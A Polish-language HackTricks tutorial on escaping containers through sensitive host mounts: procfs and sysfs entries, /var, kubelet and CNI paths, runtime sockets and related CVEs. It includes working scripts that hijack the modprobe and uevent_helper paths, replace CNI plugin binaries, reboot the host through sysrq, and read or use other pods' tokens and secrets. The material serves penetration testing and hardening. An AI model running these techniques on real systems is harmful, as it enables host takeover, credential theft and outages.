# Wrażliwe montowania hosta

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Montowania hosta to jedna z najważniejszych praktycznych powierzchni ucieczki z kontenera, ponieważ często niwelują starannie odizolowany widok procesu i ponownie zapewniają mu bezpośredni dostęp do zasobów hosta. Niebezpieczne przypadki nie ograniczają się do `/`. Bind mounty `/proc`, `/sys`, `/var`, gniazd runtime, stanu zarządzanego przez kubelet lub ścieżek związanych z urządzeniami mogą ujawniać mechanizmy kontroli jądra, poświadczenia, systemy plików sąsiednich kontenerów oraz interfejsy zarządzania runtime.

Ta strona została wydzielona z poszczególnych stron dotyczących zabezpieczeń, ponieważ model nadużyć obejmuje wiele obszarów. Zapis do montowania hosta jest niebezpieczny częściowo z powodu przestrzeni nazw montowań, częściowo z powodu przestrzeni nazw użytkowników, częściowo z powodu zakresu ochrony AppArmor lub SELinux, a częściowo z powodu konkretnej ujawnionej ścieżki hosta. Omówienie tego zagadnienia jako osobnego tematu znacznie ułatwia analizę powierzchni ataku.

Porównaj też katalog hosta z prawem do zapisu z odpowiadającą mu ścieżką wewnątrz każdego kontenera. Jeśli jest zamontowany w katalogu zawierającym wykonywalne skrypty startowe, użytkownik hosta o niższych uprawnieniach może umieścić tam kod, który punkt wejścia kontenera o wyższych uprawnieniach załaduje przy następnym restarcie. Potwierdź dokładne źródło i miejsce docelowe bind mounta, uprawnienia do zapisu i przeszukiwania katalogu, pętlę punktu wejścia i wymóg dotyczący pliku wykonywalnego, UID runtime oraz rzeczywisty mechanizm wyzwalający restart. UID 0 kontenera nie oznacza automatycznie UID 0 hosta; o wpływie na hosta decydują mapowanie przestrzeni nazw użytkowników i zasady montowania. Pasywny przegląd powinien wskazywać ścieżki i uprawnienia, nie zapisując skryptu ani nie restartując obciążenia.

Kontener Linux może działać wewnątrz maszyny wirtualnej zarządzającej, która udostępnia część systemu plików osobnego hosta Windows. [Foldery współdzielone VirtualBox](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) to jeden ze sposobów udostępniania plików hosta systemowi gościa, ale root w tej maszynie wirtualnej nadal jest inną tożsamością niż administrator Windows. Jeśli udział udostępnia odczytywalny prywatny klucz SSH użytkownika, potraktuj go jako trop dotyczący poświadczeń: zweryfikuj dokładne montowanie oparte na hoście, właściciela klucza i dostęp do niego, pasujące konto oraz **efektywne** zasady dotyczące autoryzowanych kluczy serwera SSH w Windows, zanim stwierdzisz, że umożliwia on logowanie do hosta. Współczesny [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) często używa osobnego pliku `administrators_authorized_keys` dla kont administratorów. Nie umieszczaj zawartości kluczy prywatnych w standardowych wynikach enumeracji; do pasywnej analizy wystarczą metadane montowania i ścieżki klucza.

## Ujawnienie `/proc`

procfs zawiera zarówno zwykłe informacje o procesach, jak i interfejsy jądra o dużym wpływie. Dlatego bind mount, taki jak `-v /proc:/host/proc`, lub widok kontenera ujawniający nieoczekiwane zapisywalne wpisy proc może prowadzić do ujawnienia informacji, odmowy usługi lub bezpośredniego wykonania kodu na hoście.

Ważne ścieżki procfs obejmują:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (zwłaszcza `register` i `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Nadużycie

Zacznij od sprawdzenia, które ważne wpisy procfs są widoczne lub zapisywalne:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Te ścieżki są interesujące z różnych powodów. `core_pattern`, `modprobe` i `binfmt_misc` mogą stać się ścieżkami do wykonania kodu na hoście, jeśli są zapisywalne. `kallsyms`, `kmsg`, `kcore` i `config.gz` to cenne źródła informacji rozpoznawczych przy kernel exploitation. `sched_debug` i `mountinfo` ujawniają kontekst procesów, cgroup i systemu plików, co może pomóc odtworzyć układ hosta z poziomu kontenera.

Praktyczne znaczenie każdej ścieżki jest inne, a traktowanie ich tak, jakby miały jednakowy wpływ, utrudnia triage:

- `/proc/sys/kernel/core_pattern`
  Jeśli ta ścieżka jest zapisywalna, należy do tych o największym potencjalnym wpływie w procfs, ponieważ po awarii kernel uruchomi handler potoku. Kontener, który może ustawić `core_pattern` na payload zapisany w swojej warstwie overlay lub w zamontowanej ścieżce hosta, często może uzyskać wykonanie kodu na hoście. Zobacz też [read-only-paths.md](protections/read-only-paths.md), gdzie znajduje się dedykowany przykład.
- `/proc/sys/kernel/modprobe`
  Ta ścieżka wskazuje helpera userspace, którego używa kernel, gdy musi uruchomić logikę ładowania modułów. Jeśli jest zapisywalna z kontenera i interpretowana w kontekście hosta, może stać się kolejnym prymitywem do wykonania kodu na hoście. Jest szczególnie interesująca w połączeniu z możliwością wywołania tej ścieżki helpera.
- `/proc/sys/vm/panic_on_oom`
  Zwykle nie jest to prosty prymityw ucieczki z kontenera, ale może przekształcić presję na pamięć w odmowę usługi obejmującą cały host, powodując panikę kernela w sytuacji OOM.
- `/proc/sys/fs/binfmt_misc`
  Jeśli interfejs rejestracji jest zapisywalny, atakujący może zarejestrować handler dla wybranej wartości magicznej i uzyskać wykonanie w kontekście hosta, gdy zostanie uruchomiony pasujący plik.
- `/proc/config.gz`
  Przydatny do triage exploitów kernela. Pomaga ustalić, które podsystemy, mechanizmy łagodzące i opcjonalne funkcje kernela są włączone, bez konieczności dostępu do metadanych pakietów hosta.
- `/proc/sysrq-trigger`
  To przede wszystkim ścieżka umożliwiająca odmowę usługi, ale bardzo poważną. Może natychmiast zrestartować hosta, wywołać panikę kernela lub w inny sposób zakłócić jego działanie.
- `/proc/kmsg`
  Ujawnia komunikaty z bufora pierścieniowego kernela. Przydatny do fingerprintingu hosta, analizy awarii, a w niektórych środowiskach także do wycieku informacji pomocnych przy kernel exploitation.
- `/proc/kallsyms`
  Jest cenny, gdy można go odczytać, ponieważ ujawnia informacje o eksportowanych symbolach kernela i może pomóc obejść założenia dotyczące randomizacji adresów podczas tworzenia exploita kernela.
- `/proc/[pid]/mem`
  To bezpośredni interfejs do pamięci procesu. Jeśli proces docelowy jest osiągalny i spełnione są wymagane warunki podobne do ptrace, może umożliwić odczyt lub modyfikację pamięci innego procesu. Realny wpływ zależy w dużej mierze od poświadczeń, `hidepid`, Yama i ograniczeń ptrace, więc jest to potężna, ale warunkowa ścieżka.
- `/proc/kcore`
  Udostępnia widok pamięci systemu w formie zbliżonej do obrazu core dumpa. Plik jest ogromny i niewygodny w użyciu, ale jeśli da się go odczytać w praktycznym zakresie, oznacza to poważne odsłonięcie pamięci hosta.
- `/dev/kmem` i `/dev/mem`
  Historycznie były to interfejsy urządzeń do surowej pamięci o dużym potencjalnym wpływie, a nie pliki procfs. W wielu współczesnych systemach są nieobecne lub mocno ograniczone, ale kontener, który może otworzyć zamontowaną kopię z hosta, powinien traktować to narażenie jako krytyczne. Sprawdzaj je razem z innymi wrażliwymi montowaniami `/dev`, zamiast szukać nieistniejących ścieżek `/proc/kmem` lub `/proc/mem`.
- `/proc/sched_debug`
  Ujawnia informacje o planowaniu i zadaniach, które mogą odsłonić tożsamość procesów hosta, nawet gdy inne widoki procesów wyglądają na bardziej ograniczone, niż można by się spodziewać.
- `/proc/[pid]/mountinfo`
  Jest niezwykle przydatny do odtworzenia rzeczywistej lokalizacji kontenera na hoście, ustalenia, które ścieżki są oparte na overlay, oraz sprawdzenia, czy zapisywalne montowanie wskazuje na zawartość hosta, czy tylko na warstwę kontenera.

Jeśli `/proc/[pid]/mountinfo` lub szczegóły overlay są czytelne, wykorzystaj je do ustalenia ścieżki systemu plików kontenera na hoście:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Te polecenia są przydatne, ponieważ wiele sztuczek umożliwiających wykonanie kodu na hoście wymaga przekształcenia ścieżki wewnątrz kontenera na odpowiadającą jej ścieżkę z perspektywy hosta.

### Przykład: Przygotowanie ścieżki pomocnika `modprobe`

Jeśli z kontenera można zapisywać do `/proc/sys/kernel/modprobe`, a ścieżka pomocnika jest interpretowana w kontekście hosta, można przekierować ją na payload kontrolowany przez atakującego. Katalog upper w overlay musi wskazywać właściwe miejsce z perspektywy hosta, a potwierdzenie wykonania musi zostać zapisane z powrotem w tej samej warstwie kontenera widocznej z hosta, jeśli kontener nie montuje również hostowego `/tmp`:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Dokładny mechanizm wyzwalający zależy od celu i zachowania jądra i celowo nie jest zgadywany. Przywróć pierwotną wartość przed opuszczeniem laboratorium. Ważne jest to, że zapisywalna ścieżka pomocnicza może przekierować przyszłe wywołanie helpera jądra do zawartości ścieżki hosta kontrolowanej przez atakującego. Brak `upperdir` w overlay, ścieżka, której host nie może rozwiązać, montowanie sysctl tylko do odczytu albo jądro, które nigdy nie wywołuje wybranego helpera, przerywa ten łańcuch.

### Pełny przykład: rozpoznanie jądra za pomocą `kallsyms`, `kmsg` i `config.gz`

Jeśli celem jest ocena podatności na exploit, a nie natychmiastowe wydostanie się z kontenera:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Te polecenia pomagają ustalić, czy widoczne są przydatne informacje o symbolach, czy ostatnie komunikaty jądra ujawniają interesujący stan oraz które funkcje lub mechanizmy ochronne jądra zostały wkompilowane. Zwykle nie prowadzi to bezpośrednio do ucieczki z kontenera, ale może znacznie przyspieszyć analizę podatności jądra.

### Pełny przykład: ponowne uruchomienie hosta przez SysRq

Jeśli `/proc/sysrq-trigger` jest zapisywalny i zapewnia dostęp do widoku hosta:

```bash
echo b > /proc/sysrq-trigger
```

Efekt to natychmiastowy reboot hosta. To nie jest subtelny przykład, ale wyraźnie pokazuje, że dostęp do procfs może mieć znacznie poważniejsze skutki niż ujawnienie informacji.

## Ekspozycja `/sys`

sysfs udostępnia duże ilości informacji o stanie jądra i urządzeń. Niektóre ścieżki sysfs są przydatne głównie do fingerprintingu, a inne mogą wpływać na uruchamianie programów pomocniczych, działanie urządzeń, konfigurację modułów bezpieczeństwa lub stan firmware’u.

Ścieżki sysfs o dużym znaczeniu:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Te ścieżki mają znaczenie z różnych powodów. `/sys/class/thermal` może wpływać na działanie zarządzania temperaturą, a tym samym na stabilność hosta w środowiskach z niewłaściwie skonfigurowanym dostępem. `/sys/kernel/vmcoreinfo` może leakować informacje o zrzutach awaryjnych i układzie jądra, przydatne do niskopoziomowego fingerprintingu hosta. `/sys/kernel/security` to interfejs `securityfs` używany przez Linux Security Modules, więc nieoczekiwany dostęp do niego może ujawnić lub zmienić stan związany z MAC. Ścieżki zmiennych EFI mogą wpływać na ustawienia rozruchu przechowywane w firmware, przez co są znacznie groźniejsze niż zwykłe pliki konfiguracyjne. `debugfs` w `/sys/kernel/debug` jest szczególnie niebezpieczny, ponieważ jest to interfejs przeznaczony dla deweloperów, wobec którego obowiązują znacznie mniejsze wymagania bezpieczeństwa niż w przypadku utwardzonych produkcyjnych API jądra.

Każdy wpis sysfs z tej listy zależy od **jądra, konfiguracji i sprzętu**. Współczesne węzły środowisk zwirtualizowanych często w ogóle nie zawierają `uevent_helper`, zmiennych EFI ani wpisów urządzeń termicznych. Brakującą ścieżkę należy odnotować jako niespełniony warunek wstępny, zamiast zakładać, że przykład z innego jądra będzie mieć zastosowanie.

Przydatne polecenia do sprawdzenia tych ścieżek:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Co sprawia, że te polecenia są interesujące:

- `/sys/kernel/security` może ujawnić, czy AppArmor, SELinux lub inny interfejs LSM jest widoczny w sposób, który powinien być dostępny wyłącznie z poziomu hosta.
- `/sys/kernel/debug` jest często najbardziej niepokojącym znaleziskiem w tej grupie. Jeśli `debugfs` jest zamontowany i można go odczytywać lub zapisywać, należy spodziewać się szerokiej powierzchni dostępu do jądra, której dokładne ryzyko zależy od włączonych węzłów debugowania.
- Dostęp do zmiennych EFI jest rzadszy, ale jeśli występuje, ma poważne konsekwencje, ponieważ dotyczy ustawień przechowywanych w firmware, a nie zwykłych plików środowiska uruchomieniowego.
- `/sys/class/thermal` ma znaczenie głównie dla stabilności hosta i interakcji ze sprzętem, a nie dla prostego escape’a w stylu powłoki.
- `/sys/kernel/vmcoreinfo` jest przede wszystkim źródłem informacji do identyfikacji hosta i analizy awarii, przydatnym do zrozumienia niskopoziomowego stanu jądra.

### Pełny przykład: `uevent_helper`

`/sys/kernel/uevent_helper` zależy od jądra i jego konfiguracji; w wielu obecnych systemach tego pliku nie ma. Jeśli istnieje, można go zapisywać i dostępny jest użyteczny wyzwalacz `uevent`, jądro może uruchomić kontrolowany przez atakującego program pomocniczy. W wyniku potwierdzającym należy użyć ścieżki widocznej zarówno z perspektywy hosta, jak i kontenera:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Powodem, dla którego to działa, jest interpretowanie ścieżki helpera z perspektywy hosta. Po wyzwoleniu helper działa w kontekście hosta, a nie wewnątrz bieżącego kontenera. `/sys/class/mem/null/uevent` to konkretny trigger dostępny w jądrach, które go udostępniają; inne urządzenia mogą udostępniać własne pliki `uevent`, ale nie wybieraj żadnego z nich w ciemno na rzeczywistym sprzęcie. Przywróć pierwotną wartość przed opuszczeniem labu. Nie zgłaszaj tej techniki jako dostępnej, jeśli nie ma pliku helpera lub kontrolowanego triggera.

## `/var` Exposure

Montowanie `/var` hosta w kontenerze jest często niedoceniane, bo nie wygląda tak dramatycznie jak montowanie `/`. W praktyce może wystarczyć, aby uzyskać dostęp do socketów runtime, katalogów snapshotów kontenerów, wolumenów podów zarządzanych przez kubelet, projektowanych tokenów service account oraz systemów plików sąsiadujących aplikacji. We współczesnych węzłach `/var` często zawiera najbardziej interesujący operacyjnie stan kontenerów.

### Przykład Kubernetes

Pod z `hostPath: /var` często może odczytywać projektowane tokeny innych podów i zawartość snapshotów overlay:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Te polecenia są przydatne, ponieważ pozwalają ustalić, czy mount udostępnia tylko nieistotne dane aplikacji, czy też poświadczenia klastra o dużym znaczeniu. Możliwy do odczytania token service account może natychmiast zapewnić dostęp do Kubernetes API po uzyskaniu lokalnego wykonania kodu.

Jeśli token jest obecny, sprawdź, do czego zapewnia dostęp, zamiast poprzestawać na jego wykryciu:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Skutki mogą być znacznie poważniejsze niż uzyskanie dostępu do lokalnego węzła. Token z szerokimi uprawnieniami RBAC może zmienić zamontowany `/var` w sposób na przejęcie całego klastra.

### Przykład Docker i containerd

Na hostach Docker odpowiednie dane często znajdują się w `/var/lib/docker`, natomiast na węzłach Kubernetes korzystających z containerd mogą znajdować się w `/var/lib/containerd` lub ścieżkach specyficznych dla snapshottera:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Jeśli zamontowane `/var` udostępnia zapisywalną zawartość snapshotu innego workloadu, atakujący może zmodyfikować pliki aplikacji, umieścić treści w witrynie lub zmienić skrypty startowe bez ingerencji w konfigurację bieżącego kontenera.

Na **jednorazowym workloadzie laboratoryjnym** zapisywalna zawartość snapshotu może posłużyć do zademonstrowania manipulowania aplikacją, odzyskiwania sekretów lub ruchu bocznego. Najpierw przypisz identyfikator kontenera środowiska uruchomieniowego do dokładnego snapshotu i nigdy nie edytuj niepowiązanego ani produkcyjnego snapshotu:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Te polecenia są przydatne, ponieważ pokazują trzy główne rodzaje skutków zamontowania `/var`: manipulowanie aplikacją, odzyskiwanie sekretów i przemieszczanie się boczne do sąsiednich workloadów.

Zapisywanie bezpośrednio do snapshotów omija normalne zarządzanie stanem przez runtime i może uszkodzić kontener lub zniszczyć dowody. Odkrywanie tylko do odczytu zostało lokalnie odtworzone z użyciem Docker `overlay2`: znacznik zapisany w sąsiednim, tymczasowym kontenerze pojawił się pod `/var/lib/docker/overlay2/<id>/diff/`. Rzeczywiste modyfikacje snapshotów ogranicz do tymczasowego kontenera utworzonego na potrzeby tego testu.

## Stan Kubelet, wtyczki i ścieżki CNI

Montowanie `/var/lib/kubelet`, `/opt/cni/bin` lub `/etc/cni/net.d` jest często udostępniane przez uprzywilejowane DaemonSety, agentów CNI, wtyczki CSI node, operatorów GPU i narzędzia pomocnicze pamięci masowej. Łatwo uznać te montowania za „infrastrukturę węzła”, ale znajdują się one bezpośrednio na ścieżce wykonywania nowych podów i często zawierają dane uwierzytelniające kubelet, projected secrets, gniazda rejestracyjne oraz wykonywalne pliki binarne wtyczek działających po stronie hosta.

Cele o wysokiej wartości obejmują:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Przydatne polecenia do przeglądu:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Dlaczego te ścieżki są ważne:

- `/var/lib/kubelet/pki` może ujawniać certyfikaty klienta kubelet oraz inne poświadczenia lokalne dla węzła, które czasami można ponownie wykorzystać w komunikacji z API serverem lub punktami końcowymi TLS obsługującymi kubelet, zależnie od projektu klastra.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` często zawiera tokeny service account i zamontowane Secrets należące do sąsiednich podów na tym samym węźle.
- `/var/lib/kubelet/pod-resources/kubelet.sock` służy głównie do rozpoznania, ale jest bardzo przydatny: ujawnia, które pody i kontenery aktualnie korzystają z GPU, hugepages, urządzeń SR-IOV i innych rzadkich zasobów lokalnych dla węzła.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` i `/var/lib/kubelet/plugins_registry` ujawniają, które wtyczki CSI, DRA i device plugins są zainstalowane oraz z którymi socketami kubelet ma się komunikować. Jeśli te katalogi są zapisywalne, a nie tylko możliwe do odczytu, problem staje się znacznie poważniejszy.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` i `/etc/cni/net.d` znajdują się bezpośrednio na ścieżce konfiguracji sieci podów. Dostęp umożliwiający zapis często stanowi opóźniony mechanizm uzyskania wykonania kodu na hoście, a nie tylko ujawnienie konfiguracji.<sup>[[2]](#references)</sup>

### Pełny przykład: zapisywalny `/opt/cni/bin`

Jeśli katalog hosta z plikami binarnymi CNI jest zamontowany z prawem zapisu, podmiana wtyczki może wystarczyć do uzyskania wykonania kodu na hoście przy następnym utworzeniu przez kubelet piaskownicy poda na tym węźle:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Nie jest to tak bezpośrednie jak zamontowany `docker.sock`, ale często jest bardziej realistyczne w przejętych podach infrastrukturalnych Kubernetes. Znacznik jest zapisywany obok zamontowanej wtyczki, dzięki czemu kontener może go pobrać nawet bez montowania host-root ani hostowego `/tmp`. Wrapper zachowuje oryginalne argumenty i standardowe wejście, a następnie przykład przywraca oryginalny plik binarny. Najważniejsze jest to, że zmodyfikowany plik binarny zostaje później uruchomiony w ramach konfiguracji sieci hosta, a nie przez bieżący kontener. Korzystaj wyłącznie z jednorazowego węzła, ponieważ nieprawidłowy wrapper może uniemożliwić nowym sandboxom Pod uzyskanie łączności sieciowej.

## Gniazda środowiska uruchomieniowego

Wrażliwe montowania hosta często obejmują gniazda środowiska uruchomieniowego, a nie całe katalogi. Są one tak ważne, że warto wyraźnie je tutaj ponownie wymienić:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Zobacz [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md), aby poznać pełne scenariusze wykorzystania po zamontowaniu jednego z tych socketów.

Przykładowy wzorzec szybkiej pierwszej interakcji:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Jeśli jedna z tych metod zadziała, droga od „zamontowanego socketu” do „uruchomienia bardziej uprzywilejowanego kontenera równorzędnego” jest zazwyczaj znacznie krótsza niż jakakolwiek droga wykorzystująca kernel breakout.

Dostęp do tego samego daemona może również umożliwić **utrzymanie dostępu do hosta**. Kontener pomocniczy z zapisywalnym bind mountem katalogu głównego hosta może otrzymać pliki przez `docker cp`, a następnie użyć `docker exec`, aby umieścić klucz SSH, jednostkę usługi lub inny plik zapewniający utrzymanie dostępu w zamontowanej ścieżce hosta. Granicę bezpieczeństwa wyznacza uprawnienie daemona do tworzenia mountu hosta; `docker cp` to tylko etap pośredni. Po ujawnieniu socketu runtime’u sprawdzaj zarówno nowo utworzone kontenery, jak i zapisy w ścieżkach hosta związanych z uwierzytelnianiem lub uruchamianiem.

## Writable Host Path Task Hijack

Zapisywalny mount hosta nie musi udostępniać `/`, aby stanowić zagrożenie. Jeśli zamontowana ścieżka zawiera skrypty, pliki konfiguracyjne, hooki, pluginy lub pliki wykorzystywane później przez zaplanowane zadanie albo usługę działającą po stronie hosta, kontener może być w stanie zmienić to, co host wykona.

Ogólny przebieg przeglądu:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Jeśli proces hosta korzysta z zapisywalnego pliku, podczas testowania payload powinien być prosty i łatwy do zaobserwowania:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

Ciekawym aspektem jest granica zaufania: zapis odbywa się wewnątrz kontenera, ale wykonanie następuje później w kontekście usługi hosta. W ten sposób wąski hostPath lub bind mount staje się prymitywem umożliwiającym opóźnione wykonanie kodu na hoście.

## Pliki należące do roota na współdzielonej ścieżce hosta

Konto w kontenerze, które może uzyskać uprawnienia roota, może być w stanie umieścić plik należący do roota w zapisywalnej ścieżce używanej również przez hosta. Jeśli UID 0 w kontenerze mapuje się na UID 0 hosta, oba widoki wskazują ten sam plik, a montowanie hosta zezwala na wykonywanie SUID, użytkownik hosta, który może uruchomić należący do roota plik wykonywalny SUID w tej ścieżce, może przekroczyć granicę uprawnień hosta. W przypadku tego konkretnego problemu z własnością pliku kontener nie musi działać z `--privileged`. Zobacz [mapowania user namespace](protections/namespaces/user-namespace.md) oraz [omówienie SUID](privileged-containers.md), aby poznać odrębne warunki.

Sprawdź ścieżkę **z obu stron**: porównaj własność i tożsamość nieszkodliwego pliku, sprawdź `uid_map` i `gid_map` kontenera oraz opcje montowania i zasady wykonywania na hoście. `rw` po stronie kontenera bez `nosuid` to jedynie przesłanka do dalszej weryfikacji; nie pozwala ustalić własności pliku na hoście, flag montowania hosta, dostępu użytkownika hosta ani tego, czy AppArmor/SELinux blokuje wykonanie. `noexec` ogranicza wykonywanie w widoku, w którym ma zastosowanie. Znaczniki `shared:` i `master:` w `/proc/self/mountinfo` opisują propagację montowania, a nie to, czy zawartość pliku jest współdzielona z hostem. Bind mount może nie mieć tych znaczników. Ponowne użycie poświadczeń umożliwiające logowanie do hosta to osobny krok, niezwiązany z granicą uprawnień wynikającą ze współdzielenia pliku.

Pamięć masowa środowiska uruchomieniowego hosta może tworzyć podobną ścieżkę nawet bez jawnego bind mount. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) umożliwiało nieuprzywilejowanemu użytkownikowi hosta przechodzenie przez podkatalogi danych Dockera i wykonywanie plików z systemu plików kontenera; Moby naprawiło uprawnienia w wersji 20.10.9 i zaznacza, że uruchomione kontenery trzeba zrestartować, aby poprawić ich katalogi. Sprawdź dokładne ścieżki montowania `overlay2/<id>/merged` oraz uprawnienia wyszukiwania każdego katalogu nadrzędnego, a następnie ustal, czy UID 0 kontenera mapuje się na UID 0 hosta, czy istnieje dostępny plik wykonywalny SetUID należący do roota i czy widok hosta zezwala na wykonywanie SetUID. Kontenery rootless lub z remapowaniem user namespace, `nosuid`, `noexec`, `no_new_privs` oraz polityka MAC mogą zmienić wynik. Sama wersja środowiska uruchomieniowego lub dostępna ścieżka to wskazówka do dalszej weryfikacji, a nie dowód na wykonanie kodu z uprawnieniami roota hosta; sprawdź metadane montowania i pliku, nie uruchamiając podejrzanego pliku wykonywalnego.

## CVE związane z montowaniem

Montowania hosta mają też związek z lukami w środowiskach uruchomieniowych. Do ważnych niedawnych przykładów należą:

- `CVE-2024-21626` w `runc`, gdzie leaked file descriptor do katalogu mógł spowodować umieszczenie katalogu roboczego w systemie plików hosta.
- `CVE-2024-23651`, `CVE-2024-23652` i `CVE-2024-23653` w BuildKit, gdzie złośliwe Dockerfile, frontendy i przepływy `RUN --mount` mogły ponownie umożliwić dostęp do plików hosta, ich usuwanie lub eskalację uprawnień podczas budowania.
- `CVE-2024-1753` w przepływach budowania Buildah i Podman, gdzie spreparowane bind mounty podczas budowania mogły udostępnić `/` do odczytu i zapisu.
- `CVE-2025-47290` w `containerd` 2.1.0, gdzie TOCTOU podczas rozpakowywania obrazu mogło pozwolić specjalnie spreparowanemu obrazowi zmodyfikować system plików hosta podczas pobierania.

Te CVE są tu istotne, ponieważ pokazują, że obsługa montowań zależy nie tylko od konfiguracji operatora. Samo środowisko uruchomieniowe również może wprowadzać warunki ucieczki wynikające z montowania.

